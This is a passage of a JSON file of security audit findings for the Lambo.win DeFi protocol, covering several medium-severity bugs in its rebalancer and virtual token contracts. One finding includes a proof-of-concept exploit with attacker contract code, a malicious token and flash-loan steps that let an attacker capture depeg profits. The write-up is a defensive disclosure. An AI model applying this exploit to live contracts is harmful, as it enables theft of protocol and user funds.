      "description": "Submitted by\nDaniel526\n\nThe absence of a properly set\nsqrtPriceLimitX96\nallows swaps to execute at prices far beyond expected limits, exposing the contract to unfavorable trade outcomes. The function is also likely to fail at runtime due to a mismatch in struct field names (\namountIn\ninstead of\namount\n).\n\nIn the\n_getQuoteAndDirection\nfunction, the\namountIn\nparameter is incorrectly used for constructing the\nQuoteExactInputSingleWithPoolParams\nstruct. Additionally, the\nsqrtPriceLimitX96\nparameter is hardcoded to\n0\n, potentially leading to unintended behavior in price-constrained swaps.\n\nIQuoter\n.\nQuoteExactInputSingleWithPoolParams\n({\ntokenIn:\ntokenIn\n,\ntokenOut:\ntokenOut\n,\namountIn:\namountIn\n,\n// Incorrect struct field usage\nfee:\nfee\n,\npool:\nuniswapPool\n,\nsqrtPriceLimitX96:\n0\n// No price constraint is applied\n})\n\nThe\nQuoteExactOutputSingleWithPoolParams\nstruct implementation:\n\nstruct\nQuoteExactOutputSingleWithPoolParams\n{\naddress\ntokenIn\n;\naddress\ntokenOut\n;\nuint256\namount\n;\nuint24\nfee\n;\naddress\npool\n;\nuint160\nsqrtPriceLimitX96\n;\n}\n\nUpdate\n_getQuoteAndDirection\nto correctly reference the struct fields and provide configurable\nsqrtPriceLimitX96\nif needed:\n\n(\namountOut\n, , , ) =\nIQuoter\n(\nquoter\n).\nquoteExactInputSingleWithPool\n(\nIQuoter\n.\nQuoteExactInputSingleWithPoolParams\n({\ntokenIn:\ntokenIn\n,\ntokenOut:\ntokenOut\n,\namount:\namountIn\n,\n// Correct field usage\nfee:\nfee\n,\npool:\nuniswapPool\n,\nsqrtPriceLimitX96:\nsqrtPriceLimitX96\n// Example of allowing no limit\n})\n);\n\nShaneson (Lambo.win) confirmed and commented\n:\n\nGood suggestion.\nAccept."
    },
    {
      "finding_id": "2024-12-lambowin_M-06",
      "severity": "medium",
      "title": "Attacker can captureVETH-WETHdepeg profits through a malicious pool, rendering rebalancer useless if VETH Price > WETH Price",
      "description": "Submitted by\nrouhsamad\n, also found by\nm4k2\nand\nzaevlad\n\nhttps://github.com/code-423n4/2024-12-lambowin/blob/main/src/rebalance/LamboRebalanceOnUniwap.sol#L76\n\nhttps://github.com/code-423n4/2024-12-lambowin/blob/main/src/rebalance/LamboRebalanceOnUniwap.sol#L109-L114\n\nLamboRebalanceOnUniwap::rebalance\naccepts a\ndirectionMask\nargument, an arbitrary uint256 mask. It \u201cOR\u201ds this mask with uniswapPool and passes it to the OKX Router to perform\nzeroForOne\nor\noneForZero\nswaps (using the MSB).\n\nfunction\nrebalance\n(\nuint256\ndirectionMask\n,\nuint256\namountIn\n,\nuint256\namountOut\n)\nexternal\nnonReentrant\n{\nuint256\nbalanceBefore\n=\nIERC20\n(\nweth\n).\nbalanceOf\n(\naddress\n(\nthis\n));\nbytes\nmemory\ndata\n=\nabi\n.\nencode\n(\ndirectionMask\n,\namountIn\n,\namountOut\n);\nIMorpho\n(\nmorphoVault\n).\nflashLoan\n(\nweth\n,\namountIn\n,\ndata\n);\nuint256\nbalanceAfter\n=\nIERC20\n(\nweth\n).\nbalanceOf\n(\naddress\n(\nthis\n));\nuint256\nprofit\n=\nbalanceAfter\n-\nbalanceBefore\n;\nrequire\n(\nprofit\n>\n0\n,\n\"No profit made\"\n);\n}\n\nHowever, this lets an attacker find a pool address with a malicious token. Attacker needs to find a pool with a malicious coin (discussed in PoC) so that given:\n\nmalicious_mask = malicious_pool_address & (~uniswapPool)\n\nwe will have:\n\nmalicious_mask | uniswapPool = maliciousPool\n\nWhich allows attacker to insert the malicious pool here by passing\nmalicious_mask\nto\nrebalance\nfunction:\n\n// given our malicious mask, _v3Pool is the desired pool\nuint256\n_v3pool\n=\nuint256\n(\nuint160\n(\nuniswapPool\n)) | (\ndirectionMask\n);\nuint256\n[]\nmemory\npools\n=\nnew\nuint256\n[](\n1\n);\npools\n[\n0\n] =\n_v3pool\n;\n\nLater, the first condition is not met since the\ndirectionMask\nis not equal to (1 << 255). The code goes to the second condition:\n\nif\n(\ndirectionMask\n==\n_BUY_MASK\n) {\n_executeBuy\n(\namountIn\n,\npools\n);\n\nSecond condition:\n\nelse\n{\n_executeSell\n(\namountIn\n,\npools\n);\n}\n\n_executeSell\ncalls\nOKXRouter\nwith newly minted\nVETH\n(which we received at a discount, if VETH is priced higher than WETH). It then sends\nVETH\nto the malicious pool and receives malicious tokens + flash-loaned amount + 1 wei as the profit. the fact that its possible to replace the\nuniswapPool\nwith our desired malicious pool opens up an attack path which if carefully executed, gives attacker the opportunity to profit from WETH-VETH depeg, leaving Lambo.win no profits at all.\n\nThe only difficult part of this attack is that attacker needs to deploy the malicious coin (which is paired with VETH) at a specific address so that their v3 pair address satisfies this condition:\n\nmalicious_mask = malicious_pool_address & (~uniswapPool)\nmalicious_mask | uniswapPool = maliciousPool\n\nBasically the\nmalicious_pool_address\nmust have at least the same bits as the\nuniswapPool\nso that we can use a malicious mask on it.\n\nFinding an address to satisfy this is hard (but not impossible, given current hardware advancements). For the sake of this PoC to be runnable, I have assumed the address of\nuniswapPool\nis\n0x0000000000000000000000000000000000000093\n, so that we can find a malicious pool address and token easily. The actual difficulty of this attack depends on the actual address of WETH-VETH pool; however, I have used a simpler address, just to show that the attack is possible, given enough time.\n\nAfter attacker deployed the right contracts, he can use them to profit from WETH-VETH depeges forever (unless new rebalancer is created).\n\nIf\nprice(VETH) / price(WETH) > 1\n, this attack is profitable. It costs only transaction gas and leaves nothing for the Lambo.win team.\n\nTo execute the PoC, first create the necessary files:\nhttps://gist.github.com/CDDose/cf9d31046af661d077c442e437b9a06b\n\nSome interfaces are changed (added new functions) like\nINonfungiblePositionManager\n, you can fix errors after creating the files.\n\nAlso, most importantly, make sure to change\nLamboRebalanceOnUniwap::uniswapPool\nto\n0x0000000000000000000000000000000000000093\nfor the sake of testing:\n\nfunction\ninitialize\n(\naddress\n_multiSign\n,\naddress\n_vETH\n,\naddress\n_uniswap\n,\nuint24\n_fee\n)\npublic\ninitializer\n{\nrequire\n(\n_multiSign\n!=\naddress\n(\n0\n),\n\"Invalid _multiSign address\"\n);\nrequire\n(\n_vETH\n!=\naddress\n(\n0\n),\n\"Invalid _vETH address\"\n);\nrequire\n(\n_uniswap\n!=\naddress\n(\n0\n),\n\"Invalid _uniswap address\"\n);\n__Ownable_init\n(\n_multiSign\n);\n__ReentrancyGuard_init\n();\nfee\n=\n_fee\n;\nveth\n=\n_vETH\n;\nuniswapPool\n=\n0x0000000000000000000000000000000000000093\n;\n}\n\nPoC scenario\n:\n\nPrice of\nWETH-VETH\ndepegs, so\nprice(VETH) / price(WETH) > 1\n.\nAttacker creates a malicious Token (Token.sol) and a deployer (Deployer.sol) which deploys the malicious token using a salt.\nThe attacker finds a token address so that if a\nVETH-TOKEN\nUniswap v3 pool is created at a specific fee, the resulting pool address satisfies:\nATTACKER_POOL & (~MAIN_POOL) == MASK and MASK | MAIN_POOL == ATTACKER_POOL\n, attacker uses\nfindSalt.js\nto find the correct salt, given correct parameters.\nAfter finding the right salt, the attacker deploys the malicious token and creates a VETH-TOKEN Uniswap v3 pair.\nNow its possible to call\nLamboRebalanceOnUniwap::rebalance\nwith\nMASK\nso\n_v3Pool\npoints to the attacker\u2019s pool:\nuint256\n_v3pool\n=\nuint256\n(\nuint160\n(\nuniswapPool\n)) | (\ndirectionMask\n);\nuint256\n[]\nmemory\npools\n=\nnew\nuint256\n[](\n1\n);\npools\n[\n0\n] =\n_v3pool\n;\nThe attacker deploys\nAttacker.sol\n. Its\ntakeProfit\nfunction takes a Morpho flashloan, then calls\nLamboRebalanceOnUniwap::rebalance\nwith the flashloaned amount.\nfunction\ntakeProfit\n(\nuint256\nloanAmount\n)\npublic\nonlyOwner\n{\n//1 wei for profit of rebalancer\nIMorpho\n(\nmorphoVault\n).\nflashLoan\n(\nWETH\n,\nloanAmount\n+\n1\n,\nnew\nbytes\n(\n0\n));\n}\nThe\nAttacker.sol::onMorphoFlashLoan\nconfigures and supplies (with taken flash-loan) the malicious token so that it will send the given WETH to rebalancer when its \u201ctransfer\u201d function is called upon\nVETH=>MALICIOUS_COIN\nswap:\nConfigure and supply token\n:\n//Tell token how much WETH to give back to balancer\ntoken\n.\nsetWETHAmount\n(\nassets\n);\n//Then transfer required amount\nToken\n(\nWETH\n).\ntransfer\n(\naddress\n(\ntoken\n),\nassets\n);\nMalicious Token::transfer\n:\nfunction\ntransfer\n(\naddress\nto\n,\nuint\namount\n)\npublic\noverride\nreturns\n(\nbool\n) {\nERC20\n(\nWETH\n).\ntransfer\n(\nrebalancer\n,\nwethAmount\n);\nreturn\nsuper\n.\ntransfer\n(\nto\n,\namount\n);\n}\nMalicious Token::setWETHAmount\n:\nfunction\nsetWETHAmount\n(\nuint\namount\n)\npublic\n{\nwethAmount\n=\namount\n;\n}\nThis mechanism allows us to pay the profit + flash-loaned amount of rebalancer.\nAttacker.sol::onMorphoFlashLoan\nadds liquidity into the malicious pool before calling\nLamboRebalanceOnUniwap::rebalance\n(we need to provide liquidity only for one direction, VETH to our malicious coin, so that means we dont need to provdie extra VETH):\nINonfungiblePositionManager\n.\nMintParams\nmemory\nparams\n=\nINonfungiblePositionManager\n.\nMintParams\n({\ntoken0:\naddress\n(\ntoken\n) <\nvETH\n?\naddress\n(\ntoken\n) :\nvETH\n,\ntoken1:\naddress\n(\ntoken\n) <\nvETH\n?\nvETH\n:\naddress\n(\ntoken\n),\nfee:\n3000\n,\n// 0.3% pool, for example\ntickLower:\n60\n,\n//do not care\ntickUpper:\n6000\n,\n//do not care\namount0Desired:\naddress\n(\ntoken\n) <\nvETH\n?\n1e24\n:\n0\n,\namount1Desired:\naddress\n(\ntoken\n) >\nvETH\n?\n1e24\n:\n0\n,\n// If you want to start one-sided with Token\namount0Min:\n0\n,\namount1Min:\n0\n,\nrecipient:\naddress\n(\nthis\n),\ndeadline:\nblock\n.\ntimestamp\n});\n(\nuint256\ntokenId\n,\nuint128\nliquidity\n, , ) =\npositionManager\n.\nmint\n(\nparams\n);\nLamboRebalanceOnUniwap::rebalance\nis called with the attacker\u2019s\ndirectionMask\nthat results in the malicious pool:\n//Then perform the rebalancing, using our mask and assets - 1 wei\nrebalancer\n.\nrebalance\n(\nmask\n,\nassets\n-\n1\n,\n0\n);\nThen\n_executeSell\nis executed, and VETH is minted at a discount (because ETH price is higher than VETH, and we are minting it at a discount):\n1\nIWETH\n(\nweth\n).\nwithdraw\n(\namountIn\n);\n2\n//@audit receive VETH at discount\n3\nVirtualToken\n(\nveth\n).\ncashIn\n{value:\namountIn\n}(\namountIn\n);\n4\nrequire\n(\nIERC20\n(\nveth\n).\napprove\n(\naddress\n(\nOKXTokenApprove\n),\namountIn\n),\n\"Approve failed\"\n);\n5\n//@audit Swap VETH to malicious coins\n6\nIDexRouter\n(\nOKXRouter\n).\nuniswapV3SwapTo\n(\nuint256\n(\nuint160\n(\naddress\n(\nthis\n))),\namountIn\n,\n0\n,\npools\n);\nNOTE: it\u2019s on line #6 that balancer receives flash-loaned tokens + 1 wei from maliciousToken::transfer function\nMalicious pool now received VETH at a discount price.\nAttacker now withdraws liquidity, receiving VETH and the malicious coins:\n//The attack is performed, remove liquidity from our pool\n//now our pool contains 1 VETH which we got with a discount\nINonfungiblePositionManager\n.\nDecreaseLiquidityParams\nmemory\ndecreaseParams\n=\nINonfungiblePositionManager\n.\nDecreaseLiquidityParams\n({\ntokenId:\ntokenId\n,\nliquidity:\nliquidity\n,\namount0Min:\n0\n,\namount1Min:\n0\n,\ndeadline:\nblock\n.\ntimestamp\n});\n(\nuint256\namount0Removed\n,\nuint256\namount1Removed\n) =\npositionManager\n.\ndecreaseLiquidity\n(\ndecreaseParams\n);\nINonfungiblePositionManager\n.\nCollectParams\nmemory\ncollectParams\n=\nINonfungiblePositionManager\n.\nCollectParams\n({\ntokenId:\ntokenId\n,\nrecipient:\naddress\n(\nthis\n),\namount0Max:\n~\nuint128\n(\n0\n),\namount1Max:\n~\nuint128\n(\n0\n)\n});\n//Tell token no need to send anymore WETH To rebalancer\ntoken\n.\nsetWETHAmount\n(\n0\n);\n//Collect tokens from the pool\n(\nuint256\namount0Collected\n,\nuint256\namount1Collected\n) =\npositionManager\n.\ncollect\n(\ncollectParams\n);\nAttacker sells VETH on market and receives more WETH than what it flash-loaned\nrequire\n(\nToken\n(\nvETH\n).\napprove\n(\naddress\n(\nOKXTokenApprove\n),\n99999999999999999998\n),\n\"Approve failed\"\n);\nuint256\n_v3pool\n=\nuint256\n(\nuint160\n(\npool\n));\nuint256\n[]\nmemory\npools\n=\nnew\nuint256\n[](\n1\n);\npools\n[\n0\n] =\n_v3pool\n;\nIDexRouter\n(\nOKXRouter\n).\nuniswapV3SwapTo\n(\nuint256\n(\nuint160\n(\naddress\n(\nthis\n))),\n99999999999999999998\n,\n0\n,\npools\n);\nAttacker pays the flash-loan and takes rest as profit\n//give back loan\nToken\n(\nWETH\n).\napprove\n(\naddress\n(\nmorphoVault\n),\nassets\n);\n//we are left with more\nassert\n(\nToken\n(\nWETH\n).\nbalanceOf\n(\naddress\n(\nthis\n)) >\n0\n);\nconsole\n.\nlog\n(\nToken\n(\nWETH\n).\nbalanceOf\n(\naddress\n(\nthis\n)));\nIn the given PoC at gist, attacker makes 100 extra VETH.\n\nMake sure that\ndirectionMask\nis either\n(1 << 255)\nor\n0\n.\n\nShaneson (Lambo.win) confirmed and commented\n:\n\nVery good finding. Thanks, talented auditors."
    },
    {
      "finding_id": "2024-12-lambowin_M-07",
      "severity": "medium",
      "title": "Rebalance profit requirement prevents maintaining VETH/WETH peg",
      "description": "Submitted by\nEvo\n\nhttps://github.com/code-423n4/2024-12-lambowin/blob/b8b8b0b1d7c9733a7bd9536e027886adb78ff83a/src/rebalance/LamboRebalanceOnUniwap.sol#L62\n\nThe\nprofit > 0\nrequirement in the rebalance function actively prevents the protocol from maintaining the VETH/WETH 1:1 peg during unprofitable market conditions, when profit is ZERO.\n\nThe protocol documentation and team\u2019s design goals that the RebalanceOnUniswap contract is specifically designed to maintain the VETH/WETH pool ratio at 1:1, intentionally accepting gas losses as a trade-off for improved price stability.\n\nIt is mentioned in the previous audit, In the sponsor\u2019s acknowledgement (from SlowMist audit, N12):\n\nAccording to the project team, the RebalanceOnUniswap contract is designed to maintain the VETH/WETH pool ratio at 1:1 rather than for profit. Gas costs are intentionally omitted to increase rebalancing frequency, accepting gas losses as a trade-off for improved price stability.\n\nHowever, in\nLamboRebalanceOnUniwap.sol#L68\n:\n\nfunction\nrebalance\n(\nuint256\ndirectionMask\n,\nuint256\namountIn\n,\nuint256\namountOut\n)\nexternal\nnonReentrant\n{\nuint256\nbalanceBefore\n=\nIERC20\n(\nweth\n).\nbalanceOf\n(\naddress\n(\nthis\n));\nbytes\nmemory\ndata\n=\nabi\n.\nencode\n(\ndirectionMask\n,\namountIn\n,\namountOut\n);\nIMorpho\n(\nmorphoVault\n).\nflashLoan\n(\nweth\n,\namountIn\n,\ndata\n);\nuint256\nbalanceAfter\n=\nIERC20\n(\nweth\n).\nbalanceOf\n(\naddress\n(\nthis\n));\nuint256\nprofit\n=\nbalanceAfter\n-\nbalanceBefore\n;\nrequire\n(\nprofit\n>\n0\n,\n\"No profit made\"\n);\n}\n\nThe\nrequire(profit > 0)\ncheck means:\n\nRebalancing can only occur when profitable, in situations where rebalancing is needed but arbitrage profits are zero, this directly contradicts the protocol\u2019s stated design goal of accepting no profit to maintain the ratio 1:1.\n\nAn example scenario would be:\n\nVETH/WETH ratio deviates from 1:1\nRebalancing opportunity exists to restore the peg\nMarket conditions mean rebalancing would offer no profit but can still done\nThe profit check prevents rebalancing\n\nUpdate the\nrequire(profit > 0)\nto\nrequire(profit >= 0)\n.\n\nShaneson (Lambo.win) acknowledged"
    },
    {
      "finding_id": "2024-12-lambowin_M-08",
      "severity": "medium",
      "title": "Users can prevent protocol from rebalancing for his gain and cause loss of funds for protocol and its users",
      "description": "Submitted by\nmrMorningstar\n, also found by\n0xGondar\n,\nbumbleb33\n,\nbumbleb33\n, and\nEvo\n\nhttps://github.com/code-423n4/2024-12-lambowin/blame/874fafc7b27042c59bdd765073f5e412a3b79192/src/rebalance/LamboRebalanceOnUniwap.sol#L62\n\nThe protocol have a vETH token that aims to be pegged to the ETH so the ration of vETH -> ETH = 1:1. When depeg happens the protocol can mitigate that via\nrebalance\nfunction in\nLamboRebalanceOnUniwap\nthat looks like this:\n\nfunction rebalance(uint256 directionMask, uint256 amountIn, uint256 amountOut) external nonReentrant {\nuint256 balanceBefore = IERC20(weth).balanceOf(address(this));\nbytes memory data = abi.encode(directionMask, amountIn, amountOut);\nIMorpho(morphoVault).flashLoan(weth, amountIn, data);\nuint256 balanceAfter = IERC20(weth).balanceOf(address(this));\nuint256 profit = balanceAfter - balanceBefore;\nrequire(profit > 0, \"No profit made\");\n}\n\nThis function is designed to rebalance ratio by taking a flashloan from\nMorphoVault\n, which will be used on\nUniswapV3\nto make a swap, while at the same time make sure there is a profit for the caller which later can be transferred via the\nextractProfit\nfunction in the same contract.\n\nThe issue here is that\nrebalance\nfunction can be frontrun by malicious user who will make a swap directly to the pool which will make the disbalance in ratio even greater and just enough for this check to revert:\n\nrequire(profit > 0, \"No profit made\");\n\nWhich will make the whole function to revert and\nrebalance\nwill not happen.\n\nUser call the\nrebalance\nfunction to restore vETH-ETH ratio\nMalicious user sees the tx in mempool and front-runs it (for example to swap WETH to vETH which will inflate value of vETH)\nThen the\nrebalance\nfunction is executed and flash loan is taken and going for swap\nThe protocol receives less vETH than it should\nNot enough WETH is deposited so the\nprofit <= 0\nwhich will make\nrebalance\nrevert\nMalicious user can furthermore use the vETH he got to swap and exploit the other Lambo tokens and inflate other pools for its gain via\nLamboVETHRouter\nas its expected ratio in\nbuyQuote\nis 1:1 for vETH/ETH (also by this comment\nhere\n), by swapping his gained vETH for desired\ntargetToken\n.\n\nIn the end, the attacker successfully DoS the\nrebalance\nfunction and since the\nrebalance\nis designed to ignore gas costs to increase rebalancing frequency, accepting gas losses as a trade-off for improved price stability.  This will result in no profit but even a net loss of funds for the protocol and other users that are in the pool where one pair of tokens is inflated vETH. This will motivate malicious users to keep doing these attacks and stop the protocol from rebalancing as long as it is profitable for him.\n\nRepeg can be DoS-ed which will prevent the protocol from rebalancing and will incur loss of funds.\n\nThere is no easy solution but, one solution is to use\npreviewRebalance\nin the\nrebalance\nfunction and compare the returned values and profitability with inputted amounts by the user so even if the attacker front-runs it, the function reverts even before flashloan is taken.  That can save additional gas cost and it will make each time more expensive and unprofitable for the attacker to perform that attack. Also to include a mechanism that will account for the possibility of inflated vETH values in\nLamboVETHRouter\n."
    },
    {
      "finding_id": "2024-12-lambowin_M-09",
      "severity": "medium",
      "title": "Rebalance will be completely dossed if OKX commision rate goes beyond the fee limits",
      "description": "Submitted by\ninh3l\n, also found by\nBauchibred\n,\nEvo\n, and\nMSaptarshi\n\nhttps://github.com/code-423n4/2024-12-lambowin/blob/874fafc7b27042c59bdd765073f5e412a3b79192/src/rebalance/LamboRebalanceOnUniwap.sol#L89-L114\n\nRebalancing interacts with OKXRouter to swap weth for tokens in certain pools and vice versa. But OKXRouter may charge commissions on both the from token and to token, which reduces potential profit to be made from the rebalance operation, if high enough causes there to be no profit made, which will cause the operation to fail, or in extreme cases, if the commision is set beyond its expected limits, cause a permanent dos of the function.\n\nrebalance\ncalls morpho\nflashloan\nwhich calls the\nonMorphoFlashLoan\nhook.\n\nfunction\nrebalance\n(\nuint256\ndirectionMask\n,\nuint256\namountIn\n,\nuint256\namountOut\n)\nexternal\nnonReentrant\n{\nuint256\nbalanceBefore\n=\nIERC20\n(\nweth\n).\nbalanceOf\n(\naddress\n(\nthis\n));\nbytes\nmemory\ndata\n=\nabi\n.\nencode\n(\ndirectionMask\n,\namountIn\n,\namountOut\n);\n>>\nIMorpho\n(\nmorphoVault\n).\nflashLoan\n(\nweth\n,\namountIn\n,\ndata\n);\nuint256\nbalanceAfter\n=\nIERC20\n(\nweth\n).\nbalanceOf\n(\naddress\n(\nthis\n));\nuint256\nprofit\n=\nbalanceAfter\n-\nbalanceBefore\n;\nrequire\n(\nprofit\n>\n0\n,\n\"No profit made\"\n);\n}\n\nonMorphoFlashLoan\n, depending on the set direction executes buy or sell transaction using OKXRouter.\n\nfunction\nonMorphoFlashLoan\n(\nuint256\nassets\n,\nbytes\ncalldata\ndata\n)\nexternal\n{\nrequire\n(\nmsg\n.\nsender\n==\naddress\n(\nmorphoVault\n),\n\"Caller is not morphoVault\"\n);\n(\nuint256\ndirectionMask\n,\nuint256\namountIn\n,\nuint256\namountOut\n) =\nabi\n.\ndecode\n(\ndata\n, (\nuint256\n,\nuint256\n,\nuint256\n));\nrequire\n(\namountIn\n==\nassets\n,\n\"Amount in does not match assets\"\n);\nuint256\n_v3pool\n=\nuint256\n(\nuint160\n(\nuniswapPool\n)) | (\ndirectionMask\n);\nuint256\n[]\nmemory\npools\n=\nnew\nuint256\n[](\n1\n);\npools\n[\n0\n] =\n_v3pool\n;\nif\n(\ndirectionMask\n==\n_BUY_MASK\n) {\n>>\n_executeBuy\n(\namountIn\n,\npools\n);\n}\nelse\n{\n>>\n_executeSell\n(\namountIn\n,\npools\n);\n}\nrequire\n(\nIERC20\n(\nweth\n).\napprove\n(\naddress\n(\nmorphoVault\n),\nassets\n),\n\"Approve failed\"\n);\n}\n\nOKXRouter, for its transactions charges a fee from both the\nfrom\nand\nto\ntoken. This is important as according to the\nreadme\n, issues from external integrations enabling fees while affecting the protocol are in scope.\n\nfunction\n_executeBuy\n(\nuint256\namountIn\n,\nuint256\n[]\nmemory\npools\n)\ninternal\n{\nuint256\ninitialBalance\n=\naddress\n(\nthis\n).\nbalance\n;\n// Execute buy\nrequire\n(\nIERC20\n(\nweth\n).\napprove\n(\naddress\n(\nOKXTokenApprove\n),\namountIn\n),\n\"Approve failed\"\n);\n>>\nuint256\nuniswapV3AmountOut\n=\nIDexRouter\n(\nOKXRouter\n).\nuniswapV3SwapTo\n(\nuint256\n(\nuint160\n(\naddress\n(\nthis\n))),\namountIn\n,\n0\n,\npools\n);\nVirtualToken\n(\nveth\n).\ncashOut\n(\nuniswapV3AmountOut\n);\n// SlowMist [N11]\nuint256\nnewBalance\n=\naddress\n(\nthis\n).\nbalance\n-\ninitialBalance\n;\nif\n(\nnewBalance\n>\n0\n) {\nIWETH\n(\nweth\n).\ndeposit\n{value:\nnewBalance\n}();\n}\n}\nfunction\n_executeSell\n(\nuint256\namountIn\n,\nuint256\n[]\nmemory\npools\n)\ninternal\n{\nIWETH\n(\nweth\n).\nwithdraw\n(\namountIn\n);\nVirtualToken\n(\nveth\n).\ncashIn\n{value:\namountIn\n}(\namountIn\n);\n>>\nrequire\n(\nIERC20\n(\nveth\n).\napprove\n(\naddress\n(\nOKXTokenApprove\n),\namountIn\n),\n\"Approve failed\"\n);\nIDexRouter\n(\nOKXRouter\n).\nuniswapV3SwapTo\n(\nuint256\n(\nuint160\n(\naddress\n(\nthis\n))),\namountIn\n,\n0\n,\npools\n);\n}\n\nFrom the router\u2019s\nuniswapV3SwapTo\nfunction, we can see that a commission is taken from the \u201cfrom\u201d token and from the \u201cto\u201d token after swap. The presence of these fees, for the first part reduces the potential profit that the protocol stands to make from the flashloan, leading to a loss of \u201cpositive yield\u201d. Worse still is if the commision is high enough, no profit will be made, causing the rebalance function to\nrevert\ndue to the requirement that profit is made during every rebalance operation.\n\nfunction\n_uniswapV3SwapTo\n(\naddress\npayer\n,\nuint256\nreceiver\n,\nuint256\namount\n,\nuint256\nminReturn\n,\nuint256\n[]\ncalldata\npools\n)\ninternal\nreturns\n(\nuint256\nreturnAmount\n) {\nCommissionInfo\nmemory\ncommissionInfo\n=\n_getCommissionInfo\n();\n(\naddress\nmiddleReceiver\n,\nuint256\nbalanceBefore\n>>      ) =\n_doCommissionFromToken\n(\ncommissionInfo\n,\naddress\n(\nuint160\n(\nreceiver\n)),\namount\n);\n(\nuint256\nswappedAmount\n, ) =\n_uniswapV3Swap\n(\npayer\n,\npayable\n(\nmiddleReceiver\n),\namount\n,\nminReturn\n,\npools\n);\n>>\nuint256\ncommissionAmount\n=\n_doCommissionToToken\n(\ncommissionInfo\n,\naddress\n(\nuint160\n(\nreceiver\n)),\nbalanceBefore\n);\nreturn\nswappedAmount\n-\ncommissionAmount\n;\n}\n\nAnd finally, if the commission\nrate\nexceeds exceeds its preset\ncommissionRateLimit\neither for the\nfromToken\nor\ntoToken\n, will also cause the function to also revert, dossing rebalancing.\n\nfunction\n_doCommissionFromToken\n(\nCommissionInfo\nmemory\ncommissionInfo\n,\naddress\nreceiver\n,\nuint256\ninputAmount\n)\ninternal\nreturns\n(\naddress\n,\nuint256\n) {\n//...\nlet\nrate\n:=\nmload\n(\nadd\n(\ncommissionInfo\n, 0x40))\n>>\nif\ngt\n(\nrate\n,\ncommissionRateLimit\n) {\n_revertWithReason\n(\n0x0000001b6572726f7220636f6d6d697373696f6e2072617465206c696d697400\n,\n0x5f\n)\n//\"error commission rate limit\"\n}\n//...\n\nfunction\n_doCommissionToToken\n(\nCommissionInfo\nmemory\ncommissionInfo\n,\naddress\nreceiver\n,\nuint256\nbalanceBefore\n)\ninternal\nreturns\n(\nuint256\namount\n) {\nif\n(!\ncommissionInfo\n.\nisToTokenCommission\n) {\nreturn\n0\n;\n}\n//...\nlet\nrate\n:=\nmload\n(\nadd\n(\ncommissionInfo\n, 0x40))\n>>\nif\ngt\n(\nrate\n,\ncommissionRateLimit\n) {\n_revertWithReason\n(\n0x0000001b6572726f7220636f6d6d697373696f6e2072617465206c696d697400\n,\n0x5f\n)\n//\"error commission rate limit\"\n}\n//..."
    },
    {
      "finding_id": "2024-12-lambowin_M-10",
      "severity": "medium",
      "title": "LP for v3 pool of underlying tokens with decimals!= 18would have incorrect NFT metadata",
      "description": "Submitted by\nprapandey031\n, also found by\nAgontuk\n,\nbumbleb33\n,\nColdless\n,\nDaniel526\n,\nMrPotatoMagic\n, and\nTenderBeastJr\n\nhttps://github.com/code-423n4/2024-12-lambowin/blob/main/src/VirtualToken.sol#L10\n\nThe VirtualToken.sol has a hardcoded decimal value of 18 even if the underlying token has a decimal value of 6 (for eg, USDC). This would not let the liquidity providers of the (vUSDC, USDC) uniswap v3 pool to get the correct metadata for their NFT liquidity position.\n\nBelow is a step-by-step PoC to explain the issue in detail.\n\nThe VirtualToken.sol is an ERC-20 token contract that has hardcoded 18 decimals:\n\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/blob/cceac54953ccda8a9a028d0b9bf4378605fdf67e/contracts/token/ERC20/ERC20.sol#L78\n\nfunction decimals() public view virtual returns (uint8) {\nreturn 18;\n}\n\nLet\u2019s say vUSDC is the virtual token contract with the underlying token as USDC. USDC has 6 decimals.\n\nNow, as per the protocol, there would be a (vUSDC, USDC) uniswap v3 pool with 1:1 peg so that users could make swap and liquidity providers could provide (vUSDC, USDC) liquidity to the v3 pool.\n\nLet\u2019s say a user X has provided liquidity to the (vUSDC, USDC) v3 pool. He would hold a liquidity position NFT:\n\nhttps://github.com/Uniswap/v3-periphery/blob/main/contracts/NonfungiblePositionManager.sol#L128\n\nfunction\nmint\n(\nMintParams\ncalldata\nparams\n)\nexternal\npayable\noverride\ncheckDeadline\n(params.deadline)\nreturns\n(\nuint256\ntokenId\n,\nuint128\nliquidity\n,\nuint256\namount0\n,\nuint256\namount1\n)\n{\nIUniswapV3Pool\npool\n;\n(\nliquidity\n,\namount0\n,\namount1\n,\npool\n) =\naddLiquidity\n(\nAddLiquidityParams\n({\ntoken0:\nparams\n.\ntoken0\n,\ntoken1:\nparams\n.\ntoken1\n,\nfee:\nparams\n.\nfee\n,\nrecipient:\naddress\n(\nthis\n),\ntickLower:\nparams\n.\ntickLower\n,\ntickUpper:\nparams\n.\ntickUpper\n,\namount0Desired:\nparams\n.\namount0Desired\n,\namount1Desired:\nparams\n.\namount1Desired\n,\namount0Min:\nparams\n.\namount0Min\n,\namount1Min:\nparams\n.\namount1Min\n})\n);\n_mint\n(\nparams\n.\nrecipient\n, (\ntokenId\n=\n_nextId\n++));\nbytes32\npositionKey\n=\nPositionKey\n.\ncompute\n(\naddress\n(\nthis\n),\nparams\n.\ntickLower\n,\nparams\n.\ntickUpper\n);\n(,\nuint256\nfeeGrowthInside0LastX128\n,\nuint256\nfeeGrowthInside1LastX128\n, , ) =\npool\n.\npositions\n(\npositionKey\n);\n// idempotent set\nuint80\npoolId\n=\ncachePoolKey\n(\naddress\n(\npool\n),\nPoolAddress\n.\nPoolKey\n({\ntoken0:\nparams\n.\ntoken0\n,\ntoken1:\nparams\n.\ntoken1\n,\nfee:\nparams\n.\nfee\n})\n);\n_positions\n[\ntokenId\n] =\nPosition\n({\nnonce:\n0\n,\noperator:\naddress\n(\n0\n),\npoolId:\npoolId\n,\ntickLower:\nparams\n.\ntickLower\n,\ntickUpper:\nparams\n.\ntickUpper\n,\nliquidity:\nliquidity\n,\nfeeGrowthInside0LastX128:\nfeeGrowthInside0LastX128\n,\nfeeGrowthInside1LastX128:\nfeeGrowthInside1LastX128\n,\ntokensOwed0:\n0\n,\ntokensOwed1:\n0\n});\nemit\nIncreaseLiquidity\n(\ntokenId\n,\nliquidity\n,\namount0\n,\namount1\n);\n}\n\nThe user X could do any transaction with this NFT as he would do with a normal NFT: transfer to someone else, sell on the Uniswap v3 NFT marketplace, etc.\n\nHowever, when the marketplace would call\ntokenURI(uint256 tokenId)\nfor X\u2019s NFT metadata, wrong value of v3 pool price would be sent. Let\u2019s see the flow.\n\nThe intended v3 pool price should be near about 1 because of the peg. But when\ntokenURI(uint256 tokenId)\nis 